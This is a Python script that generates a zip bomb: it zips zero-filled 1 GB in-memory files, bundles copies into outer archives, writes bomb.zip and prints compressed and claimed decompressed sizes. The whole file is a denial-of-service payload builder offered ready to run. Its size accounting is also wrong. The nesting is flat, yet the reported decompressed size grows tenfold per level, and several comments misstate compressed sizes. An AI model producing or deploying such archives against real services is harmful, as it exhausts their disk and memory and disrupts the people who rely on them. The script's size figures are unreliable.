from typing import Dict, List
import zipfile
import io
from copy import deepcopy
import uuid

def generate_zip(files: List[Dict]) -> bytes:
    buff = io.BytesIO()
    with zipfile.ZipFile(buff, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for f in files:
            name, content = f['name'], f['content'].read()
            zf.writestr(name, content)
    return buff.getvalue()  

def dummy_zip(size) -> bytes:
    return generate_zip( # 1GB in memory zipped file
        [{
            'name': f'dummy-{uuid.uuid4().hex}',
            'content': dummy_file(size)
        }]
    )

def make_copies(zip_file, n) -> List[Dict]:
    return [
            {'name': f'dummy-{i}.zip', 'content': io.BytesIO(deepcopy(zip_file))}
            for i in range(n)
        ]  # Nearly 10 GB compressed?
    
def ten_gb_zip() -> bytes:
    dummy_zip_file = dummy_zip(1) # 1GB compressed
    files = make_copies(dummy_zip_file, 10)
    return generate_zip(files)

def zip_bomb(depth) -> bytes:
    decompressed_size = 1 # GB
    zips = []
    for i in range(1, depth + 1):
        decompressed_size *= 10 # +10 GB
        zips.append(ten_gb_zip())

    # Compress all zips to single zip
    zip_bomb = generate_zip([{
        'name': f'zip-{count}.zip', 
        'content': io.BytesIO(z)
        }
        for count, z in enumerate(zips)
    ])
    return {'content': zip_bomb, 'size': len(zip_bomb), 'decompressed': decompressed_size}


def dummy_file(size) -> bytes: # size in GB
    content = (size*1024*1024) * b'0' * 1024
    f = io.BytesIO(content)
    return f

if __name__ == "__main__":
    z = zip_bomb(5)
    content, size, decompress_size = z.values()
    with open('bomb.zip', 'wb') as f:
        f.write(content)
    print(f'Before de-compression: {size / 1000}KB')
    print(f'After de-compression: {decompress_size}GB')
